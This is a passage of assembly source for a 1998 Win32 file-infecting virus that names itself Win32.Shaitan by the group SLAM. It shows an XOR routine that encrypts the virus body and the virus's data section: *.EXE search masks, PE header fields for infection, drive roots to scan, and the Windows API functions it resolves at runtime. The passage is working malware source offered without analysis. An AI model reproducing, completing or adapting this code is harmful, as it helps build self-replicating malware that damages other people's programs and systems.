; Crypt - En/Decrypts vx data
;----------------------------------------------------------------------------
crypt:
        mov     esi,offset crypt_start  ; Start of data to en/decrypt
        add     esi,ebp                 ; Adjust with delta
        mov     ah,byte ptr [key+ebp]   ; Retrieve encryption key
        mov     ecx,crypt_end - crypt_start ; No. of bytes to encrypt
crypt_loop:
        xor     byte ptr [esi],ah       ; Encrypt one byte
        inc     esi                     ; Point to next byte to encrypt
        loop    crypt_loop              ; Loop till done...
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; Virus data -
;----------------------------------------------------------------------------
crypt_start:

testfile                dd      ?
file_handle             dd      ?
map_handle              dd      ?
view_address            dd      ?
file_match              db      "*.EXE",0
dir_match               db      "*.*",0
wfd_icd                 WIN32_FIND_DATA         ?
wfd_dir                 WIN32_FIND_DATA         ?
adj_filesize            dd      ?
new_filesize            dd      ?
PE_hdr                  dd      ?
ori_ip                  dd      ?
new_ip                  dd      ?
temp_ip                 dd      ?
file_align              dd      ?
ori_size_of_rawdata     dd      ?
size_of_rawdata         dd      ?
inc_size_of_rawdata     dd      ?
module_base             dd      ?
infect_status           dd      ?
infect_counter          dd      ?
icd_search_handle       dd      ?
dir_search_handle       dd      ?
start_dir               db      128     dup (0)
win_dir                 db      128     dup (0)
root_dir_c              db      "C:\",0
root_dir_d              db      "D:\",0
dot_dot                 db      "..",0
ori_attrib              dd      ?

NumberOfFunctions       dd      ?
AddressOfFunctions      dd      ?
AddressOfNames          dd      ?
AddressOfOrdinals       dd      ?

GPA_string              db      "GetProcAddress",0
GPA_string_len          equ     $ - offset GPA_string
_GetProcAddress         dd      ?

GMH_string              db      "GetModuleHandleA",0
GMH_string_len          equ     $ - offset GMH_string

; ASCIIZ strings of all API functions we need. The DWORDs following the API
; names will store their respective addresses...
API_strings:
CF_string               db      "CreateFileA",0
_CreateFileA            dd      ?
CFM_string              db      "CreateFileMappingA",0
_CreateFileMappingA     dd      ?
MVOF_string             db      "MapViewOfFile",0
_MapViewOfFile          dd      ?
CH_string               db      "CloseHandle",0
_CloseHandle            dd      ?
FFF_string              db      "FindFirstFileA",0
_FindFirstFileA         dd      ?
FNF_string              db      "FindNextFileA",0
_FindNextFileA          dd      ?
FC_string               db      "FindClose",0
_FindClose              dd      ?
SFP_string              db      "SetFilePointer",0
_SetFilePointer         dd      ?
SEOF_string             db      "SetEndOfFile",0
_SetEndOfFile           dd      ?
GCD_string              db      "GetCurrentDirectoryA",0
_GetCurrentDirectory    dd      ?
SCD_string              db      "SetCurrentDirectoryA",0
_SetCurrentDirectory    dd      ?
GWD_string              db      "GetWindowsDirectoryA",0
_GetWindowsDirectory    dd      ?
GCL_string              db      "GetCommandLineA",0
_GetCommandLine         dd      ?
UVOF_string             db      "UnmapViewOfFile",0
_UnmapViewOfFile        dd      ?
GFA_string              db      "GetFileAttributesA",0
_GetFileAttributes      dd      ?
SFA_string              db      "SetFileAttributesA",0
_SetFileAttributes      dd      ?
GDT_string              db      "GetDriveTypeA",0
_GetDriveType           dd      ?
NoMoreAPI_string        dd      'SLAM'

k32_string              db      "KERNEL32.DLL",0
kernel32                dd      ?

; Take credit for writing all this stuff :) ...
copyright       db      "Win32.Shaitan (c) 1998 The Shaitan [SLAM]",0

; Now do a Dark Avenger impersonation :P
dav_string      db      "This virus was written in the city of Mumbai",0

crypt_end:

key             db      0

v_end:

ends
end v_start





